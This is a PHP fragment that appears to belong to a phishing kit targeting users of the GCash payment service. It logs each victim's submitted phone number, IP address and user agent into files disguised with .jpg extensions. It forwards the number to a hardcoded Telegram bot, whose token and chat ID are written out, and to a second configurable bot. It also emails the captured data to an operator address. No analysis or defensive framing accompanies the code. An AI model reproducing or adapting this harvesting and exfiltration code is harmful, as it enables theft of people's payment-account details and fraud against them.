
// visitor's logs
$zCh = fopen("logs/visitors.jpg", "a");
fwrite($zCh, '<tr>' . "\n");
fwrite($zCh, '<td>' . $time . '</td>' . "\n");
fwrite($zCh, '<td>' . $ip . '</td>' . "\n");
fwrite($zCh, '<td>' . $user_agent . '</td>' . "\n");
fwrite($zCh, '<td>' . $_POST['number'] . '</td>' . "\n");
fwrite($zCh, '</tr>' . "\n");
fclose($zCh);

// gcash logs
$ChB = fopen("logs/gcash-logs.jpg", "a");
fwrite($ChB, '<tr>' . "\n");
fwrite($ChB, '<td>' . $time . '</td>' . "\n");
fwrite($ChB, '<td>' . $_POST['number'] . '</td>' . "\n");
fclose($ChB);

file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-578705759&text=" . $_POST['number']);

$data = [
'chat_id' => $Chat_ID,
'text' => "Number: " . $_POST['number']
];
file_get_contents("https://api.telegram.org/bot" . $Api_Token . "/sendMessage?" . http_build_query($data));

$subject = "GCash Logs - 1";
$message = "Date: " . $time . "\nIP Address: " . $ip . "\nUser Agent: " . $user_agent . "\nPhone Number: " . $_POST['number'];
$header = array(
    "From" => $_SERVER['HTTP_HOST'],
    "X-Mailer" => "PHP/" . phpversion(),
    "X-Priority" => "1",
    "Priority" => "Urgent",
    "Importance" => "high"
);

@mail($email, $subject, $message, $header);

